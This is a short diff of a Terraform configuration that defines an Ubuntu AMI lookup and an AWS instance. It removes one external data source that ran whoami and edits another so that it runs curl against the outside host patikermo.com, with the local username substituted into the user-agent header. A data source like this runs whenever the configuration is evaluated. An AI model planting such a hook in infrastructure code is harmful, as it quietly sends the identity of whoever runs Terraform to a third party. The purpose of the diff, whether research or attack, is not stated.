@@ -18,12 +18,8 @@ data "aws_ami" "ubuntu" {
   owners = ["099720109477"] # Canonical
 }
 
-data "external" "test" {
-  program = ["whoami"]
-}
-
 data "external" "example" {
-  program = ["curl", "http://patikermo.com", "-A $(whoami)"]
+  program = ["curl", "http://patikermo.com", "-A \"$(whoami)\""]
 }
 
 resource "aws_instance" "ubuntu" {
